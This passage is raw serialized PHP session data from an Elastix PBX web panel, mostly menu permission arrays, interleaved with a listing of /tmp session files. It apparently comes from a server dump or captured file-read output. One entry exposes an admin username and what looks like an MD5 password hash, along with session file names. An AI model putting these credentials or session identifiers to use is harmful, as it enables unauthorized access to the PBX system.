SMTP";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:20:"summary_by_extension";a:7:{s:2:"id";s:20:"summary_by_extension";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:7:"Summary";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:10:"conference";a:7:{s:2:"id";s:10:"conference";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:10:"Conference";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:17:"hardware_detector";a:7:{s:2:"id";s:17:"hardware_detector";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:17:"Hardware Detector";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:10:"email_list";a:7:{s:2:"id";s:10:"email_list";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:10:"Email list";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:16:"extensions_batch";a:7:{s:2:"id";s:16:"extensions_batch";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:19:"Batch of Extensions";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:7:"updates";a:7:{s:2:"id";s:7:"updates";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:7:"Updates";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:11:"email_stats";a:7:{s:2:"id";s:11:"email_stats";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:11:"Email stats";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:0;}s:5:"tools";a:7:{s:2:"id";s:5:"tools";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:5:"Tools";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:14:"backup_restore";a:7:{s:2:"id";s:14:"backup_restore";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:14:"Backup/Restore";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:9:"vacations";a:7:{s:2:"id";s:9:"vacations";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:9:"Vacations";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:3:"fop";a:7:{s:2:"id";s:3:"fop";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:5:"panel";s:4:"Name";s:20:"Flash Operator Panel";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:11:"preferences";a:7:{s:2:"id";s:11:"preferences";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:11:"Preferences";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"10";s:8:"HasChild";b:1;}s:12:"voipprovider";a:7:{s:2:"id";s:12:"voipprovider";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:13:"VoIP Provider";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"10";s:8:"HasChild";b:0;}s:9:"dashboard";a:7:{s:2:"id";s:9:"dashboard";s:8:"IdParent";s:7:"sysdash";s:4:"Link";s:0:"";s:4:"Name";s:9:"Dashboard";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:9:"sec_rules";a:7:{s:2:"id";s:9:"sec_rules";s:8:"IdParent";s:12:"sec_firewall";s:4:"Link";s:0:"";s:4:"Name";s:14:"Firewall Rules";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:7:"faxlist";a:7:{s:2:"id";s:7:"faxlist";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:16:"Virtual Fax List";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"11";s:8:"HasChild";b:0;}s:12:"applet_admin";a:7:{s:2:"id";s:12:"applet_admin";s:8:"IdParent";s:7:"sysdash";s:4:"Link";s:0:"";s:4:"Name";s:22:"Dashboard Applet Admin";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:9:"sec_ports";a:7:{s:2:"id";s:9:"sec_ports";s:8:"IdParent";s:12:"sec_firewall";s:4:"Link";s:0:"";s:4:"Name";s:12:"Define Ports";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:6:"faxnew";a:7:{s:2:"id";s:6:"faxnew";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:15:"New Virtual Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"12";s:8:"HasChild";b:0;}s:7:"sendfax";a:7:{s:2:"id";s:7:"sendfax";s:8:"IdParent";s:11:"virtual_fax";s:4:"Link";s:0:"";s:4:"Name";s:8:"Send Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"13";s:8:"HasChild";b:0;}s:9:"a2b_admin";a:7:{s:2:"id";s:9:"a2b_admin";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:15:"a2billing/admin";s:4:"Name";s:5:"Admin";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"21";s:8:"HasChild";b:0;}s:9:"a2b_agent";a:7:{s:2:"id";s:9:"a2b_agent";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:15:"a2billing/agent";s:4:"Name";s:5:"Agent";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"22";s:8:"HasChild";b:0;}s:12:"a2b_customer";a:7:{s:2:"id";s:12:"a2b_customer";s:8:"IdParent";s:3:"a2b";s:4:"Link";s:18:"a2billing/customer";s:4:"Name";s:8:"Customer";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"23";s:8:"HasChild";b:0;}s:18:"network_parameters";a:7:{s:2:"id";s:18:"network_parameters";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:18:"Network Parameters";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:13:"billing_rates";a:7:{s:2:"id";s:13:"billing_rates";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:5:"Rates";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:7:"sphones";a:7:{s:2:"id";s:7:"sphones";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:21:"static/softphones.htm";s:4:"Name";s:10:"Softphones";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"31";s:8:"HasChild";b:0;}s:11:"dhcp_server";a:7:{s:2:"id";s:11:"dhcp_server";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:11:"DHCP Server";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:14:"billing_report";a:7:{s:2:"id";s:14:"billing_report";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:14:"Billing Report";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:8:"faxutils";a:7:{s:2:"id";s:8:"faxutils";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:19:"static/faxutils.htm";s:4:"Name";s:13:"Fax Utilities";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"32";s:8:"HasChild";b:0;}s:15:"dhcp_clientlist";a:7:{s:2:"id";s:15:"dhcp_clientlist";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:16:"DHCP Client List";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:17:"dest_distribution";a:7:{s:2:"id";s:17:"dest_distribution";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:24:"Destination Distribution";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:16:"instantmessaging";a:7:{s:2:"id";s:16:"instantmessaging";s:8:"IdParent";s:9:"downloads";s:4:"Link";s:27:"static/instantmessaging.htm";s:4:"Name";s:17:"Instant Messaging";s:4:"Type";s:6:"framed";s:8:"order_no";s:2:"33";s:8:"HasChild";b:0;}s:11:"dhcp_by_mac";a:7:{s:2:"id";s:11:"dhcp_by_mac";s:8:"IdParent";s:7:"network";s:4:"Link";s:0:"";s:4:"Name";s:25:"Assign IP Address to Host";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"34";s:8:"HasChild";b:0;}s:13:"billing_setup";a:7:{s:2:"id";s:13:"billing_setup";s:8:"IdParent";s:7:"billing";s:4:"Link";s:0:"";s:4:"Name";s:13:"Billing Setup";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"34";s:8:"HasChild";b:0;}s:8:"userlist";a:7:{s:2:"id";s:8:"userlist";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:5:"Users";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"42";s:8:"HasChild";b:0;}s:12:"repositories";a:7:{s:2:"id";s:12:"repositories";s:8:"IdParent";s:7:"updates";s:4:"Link";s:0:"";s:4:"Name";s:12:"Repositories";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"81";s:8:"HasChild";b:0;}s:12:"asterisk_cli";a:7:{s:2:"id";s:12:"asterisk_cli";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:12:"Asterisk-Cli";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"81";s:8:"HasChild";b:0;}s:8:"packages";a:7:{s:2:"id";s:8:"packages";s:8:"IdParent";s:7:"updates";s:4:"Link";s:0:"";s:4:"Name";s:8:"Packages";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"82";s:8:"HasChild";b:0;}s:11:"file_editor";a:7:{s:2:"id";s:11:"file_editor";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:20:"Asterisk File Editor";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"82";s:8:"HasChild";b:0;}s:11:"text_to_wav";a:7:{s:2:"id";s:11:"text_to_wav";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:11:"Text to Wav";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"83";s:8:"HasChild";b:0;}s:8:"festival";a:7:{s:2:"id";s:8:"festival";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:8:"Festival";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"84";s:8:"HasChild";b:0;}s:10:"recordings";a:7:{s:2:"id";s:10:"recordings";s:8:"IdParent";s:5:"tools";s:4:"Link";s:0:"";s:4:"Name";s:10:"Recordings";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"85";s:8:"HasChild";b:0;}s:8:"language";a:7:{s:2:"id";s:8:"language";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:8:"Language";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"101";s:8:"HasChild";b:0;}s:11:"time_config";a:7:{s:2:"id";s:11:"time_config";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:9:"Date/Time";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"102";s:8:"HasChild";b:0;}s:13:"themes_system";a:7:{s:2:"id";s:13:"themes_system";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:6:"Themes";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"103";s:8:"HasChild";b:0;}s:8:"currency";a:7:{s:2:"id";s:8:"currency";s:8:"IdParent";s:11:"preferences";s:4:"Link";s:0:"";s:4:"Name";s:8:"Currency";s:4:"Type";s:6:"module";s:8:"order_no";s:3:"104";s:8:"HasChild";b:0;}s:6:"system";a:7:{s:2:"id";s:6:"system";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"System";s:4:"Type";s:0:"";s:8:"order_no";s:1:"0";s:8:"HasChild";b:1;}s:6:"agenda";a:7:{s:2:"id";s:6:"agenda";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Agenda";s:4:"Type";s:0:"";s:8:"order_no";s:1:"2";s:8:"HasChild";b:1;}s:11:"email_admin";a:7:{s:2:"id";s:11:"email_admin";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:5:"Email";s:4:"Type";s:0:"";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:3:"fax";a:7:{s:2:"id";s:3:"fax";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:3:"Fax";s:4:"Type";s:0:"";s:8:"order_no";s:1:"4";s:8:"HasChild";b:1;}s:9:"pbxconfig";a:7:{s:2:"id";s:9:"pbxconfig";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:3:"PBX";s:4:"Type";s:0:"";s:8:"order_no";s:1:"5";s:8:"HasChild";b:1;}s:2:"im";a:7:{s:2:"id";s:2:"im";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:2:"IM";s:4:"Type";s:0:"";s:8:"order_no";s:1:"6";s:8:"HasChild";b:1;}s:7:"reports";a:7:{s:2:"id";s:7:"reports";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:7:"Reports";s:4:"Type";s:0:"";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:6:"extras";a:7:{s:2:"id";s:6:"extras";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Extras";s:4:"Type";s:0:"";s:8:"order_no";s:1:"9";s:8:"HasChild";b:1;}s:6:"addons";a:7:{s:2:"id";s:6:"addons";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:6:"Addons";s:4:"Type";s:0:"";s:8:"order_no";s:2:"10";s:8:"HasChild";b:1;}s:12:"my_extension";a:7:{s:2:"id";s:12:"my_extension";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:12:"My Extension";s:4:"Type";s:0:"";s:8:"order_no";s:2:"11";s:8:"HasChild";b:1;}s:8:"security";a:7:{s:2:"id";s:8:"security";s:8:"IdParent";s:0:"";s:4:"Link";s:0:"";s:4:"Name";s:8:"Security";s:4:"Type";s:0:"";s:8:"order_no";s:2:"12";s:8:"HasChild";b:1;}}menu|s:7:"network";AMP_user|O:7:"ampuser":6:{s:8:"username";s:12:"asteriskuser";s:9:"_password";b:0;s:15:"_extension_high";s:0:"";s:14:"_extension_low";s:0:"";s:9:"_deptname";s:0:"";s:9:"_sections";a:1:{i:0;s:1:"*";}}dashboard|a:5:{s:22:"Applet_SystemResources";b:1;s:22:"Applet_ProcessesStatus";b:1;s:17:"Applet_HardDrives";b:1;s:25:"Applet_PerformanceGraphic";b:1;s:11:"Applet_News";b:1;}
+-rw------- 1 asterisk asterisk 0 Dec 24 11:12 /tmp/sess_49erbt474329sqa93bko8bjdt2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_4asdfkdhnpib82qei7c6v620b2
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_4jip8dpsfmbm6o0dtv15nrqm87
+-rw------- 1 asterisk asterisk 0 Apr  7  2017 /tmp/sess_4qcq58i5cp9n56he31hgtd2eh7
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_54s5adb2a4g15dgd1tuh42s491
+-rw------- 1 asterisk asterisk 19332 Dec 24 11:36 /tmp/sess_5h5jp2f53hmae3gil092cqqr77
+elastix_user|s:5:"admin";elastix_pass|s:32:"660e9046facd5095b46721d57c6d9fbc";elastix_user_permission|a:96:{s:9:"grouplist";a:7:{s:2:"id";s:9:"grouplist";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:6:"Groups";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:7:"sysdash";a:7:{s:2:"id";s:7:"sysdash";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:9:"Dashboard";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:11:"myex_config";a:7:{s:2:"id";s:11:"myex_config";s:8:"IdParent";s:12:"my_extension";s:4:"Link";s:0:"";s:4:"Name";s:8:"Settings";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:13:"email_domains";a:7:{s:2:"id";s:13:"email_domains";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:7:"Domains";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"calendar";a:7:{s:2:"id";s:8:"calendar";s:8:"IdParent";s:6:"agenda";s:4:"Link";s:0:"";s:4:"Name";s:8:"Calendar";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:12:"sec_firewall";a:7:{s:2:"id";s:12:"sec_firewall";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:8:"Firewall";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:17:"addons_avalaibles";a:7:{s:2:"id";s:17:"addons_avalaibles";s:8:"IdParent";s:6:"addons";s:4:"Link";s:0:"";s:4:"Name";s:6:"Addons";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:9:"cdrreport";a:7:{s:2:"id";s:9:"cdrreport";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:10:"CDR Report";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"openfire";a:7:{s:2:"id";s:8:"openfire";s:8:"IdParent";s:2:"im";s:4:"Link";s:46:"openfireWrapper.php?IP={NAME_SERVER}&PORT=9090";s:4:"Name";s:8:"OpenFire";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:9:"vtigercrm";a:7:{s:2:"id";s:9:"vtigercrm";s:8:"IdParent";s:6:"extras";s:4:"Link";s:9:"vtigercrm";s:4:"Name";s:9:"vTigerCRM";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"pbxadmin";a:7:{s:2:"id";s:8:"pbxadmin";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:17:"PBX Configuration";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:11:"virtual_fax";a:7:{s:2:"id";s:11:"virtual_fax";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:11:"Virtual Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:14:"email_accounts";a:7:{s:2:"id";s:14:"email_accounts";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:8:"Accounts";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:12:"address_book";a:7:{s:2:"id";s:12:"address_book";s:8:"IdParent";s:6:"agenda";s:4:"Link";s:0:"";s:4:"Name";s:12:"Address Book";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:15:"sec_accessaudit";a:7:{s:2:"id";s:15:"sec_accessaudit";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:5:"Audit";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:3:"a2b";a:7:{s:2:"id";s:3:"a2b";s:8:"IdParent";s:6:"extras";s:4:"Link";s:0:"";s:4:"Name";s:13:"Calling Cards";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:1;}s:12:"channelusage";a:7:{s:2:"id";s:12:"channelusage";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:14:"Channels Usage";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:13:"control_panel";a:7:{s:2:"id";s:13:"control_panel";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:14:"Operator Panel";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:9:"faxmaster";a:7:{s:2:"id";s:9:"faxmaster";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:10:"Fax Master";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:16:"group_permission";a:7:{s:2:"id";s:16:"group_permission";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:16:"Group Permission";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"network";a:7:{s:2:"id";s:7:"network";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:7:"Network";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:11:"email_relay";a:7:{s:2:"id";s:11:"email_relay";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:5:"Relay";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:13:"sec_weak_keys";a:7:{s:2:"id";s:13:"sec_weak_keys";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:9:"Weak Keys";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"billing";a:7:{s:2:"id";s:7:"billing";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:7:"Billing";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:9:"downloads";a:7:{s:2:"id";s:9:"downloads";s:8:"IdParent";s:6:"extras";s:4:"Link";s:0:"";s:4:"Name";s:9:"Downloads";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:9:"voicemail";a:7:{s:2:"id";s:9:"voicemail";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:9:"Voicemail";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:10:"faxclients";a:7:{s:2:"id";s:10:"faxclients";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:11:"Fax Clients";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"usermgr";a:7:{s:2:"id";s:7:"usermgr";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:5:"Users";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:1;}s:7:"webmail";a:7:{s:2:"id";s:7:"webmail";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:4:"mail";s:4:"Name";s:7:"Webmail";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:21:"sec_advanced_settings";a:7:{s:2:"id";s:21:"sec_advanced_settings";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:17:"Advanced Settings";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:12:"asterisk_log";a:7:{s:2:"id";s:12:"asterisk_log";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:13:"Asterisk Logs";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:10:"monitoring";a:7:{s:2:"id";s:10:"monitoring";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:10:"Monitoring";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:9:"faxviewer";a:7:{s:2:"id";s:9:"faxviewer";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:10:"Fax Viewer";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:8:"antispam";a:7:{s:2:"id";s:8:"antispam";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:8:"Antispam";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:14:"graphic_report";a:7:{s:2:"id";s:14:"graphic_report";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:14:"Graphic Report";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:21:"endpoint_configurator";a:7:{s:2:"id";s:21:"endpoint_configurator";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:21:"Endpoint Configurator";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:14:"email_template";a:7:{s:2:"id";s:14:"email_template";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:14:"Email Template";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:8:"shutdown";a:7:{s:2:"id";s:8:"shutdown";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:8:"Shutdown";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:11:"remote_smtp";a:7:{s:2:"id";s:11:"remote_smtp";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:11:"Remote SMTP";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:20:"summary_by_extension";a:7:{s:2:"id";s:20:"summary_by_extension";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:7:"Summary";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:10:"conference";a:7:{s:2:"id";s:10:"conference";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:10:"Conference";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:17:"hardware_detector";a:7:{s:2:"id";s:17:"hardware_detector";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:17:"Hardware Detector";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:10:"email_list";a:7:{s:2:"id";s:10:"email_list";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:10:"Email list";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:16:"extensions_batch";a:7:{s:2:"id";s:16:"extensions_batch";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:19:"Batch of Extensions";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"7";s:8:"HasChild";b:0;}s:7:"updates";a:7:{s:2:"id";s:7:"updates";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:7:"Updates";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:11:"email_stats";a:7:{s:2:"id";s:11:"email_stats";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:11:"Email stats";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:0;}s:5:"tools";a:7:{s:2:"id";s:5:"tools";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:5:"Tools";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"8";s:8:"HasChild";b:1;}s:14:"backup_restore";a:7:{s:2:"id";s:14:"backup_restore";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:14:"Backup/Restore";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:9:"vacations";a:7:{s:2:"id";s:9:"vacations";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:9:"Vacations";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:3:"fop";a:7:{s:2:"id";s:3:"fop";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:5:"panel";s:4:"Name";s:20:"Flash Operator Panel";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"9";s:8:"HasChild";b:0;}s:11:"preferences";a:7:{s:2:"id";s:11:"preferences";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:11:"Preferences";s:4:"Type";s:6:"module";s:8:"order_no";s:2:"10";s:8:"HasChild";b:1;}s:12:"voipprovider";a:7:{s:2:"id";s:12:"voipprovider";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:13:"VoIP 